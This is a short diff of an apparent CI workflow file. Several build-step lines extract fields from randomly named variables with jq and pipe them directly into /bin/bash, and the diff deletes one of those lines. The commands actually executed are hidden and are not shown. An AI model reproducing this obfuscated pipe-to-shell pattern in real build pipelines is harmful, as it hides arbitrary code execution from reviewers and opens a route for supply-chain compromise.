@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$vv47" | jq -r .bo73348 | /bin/bash
           printf '%s' "$vy95569" | jq -r .v19 | /bin/bash
           printf '%s' "$sua666" | jq -r .sy4926 | /bin/bash
-          echo $qeb86693 | jq -r .snh239 | /bin/bash
           echo $rgsgh13 | jq -r .dr559 | /bin/bash
 
       - name: Save archive
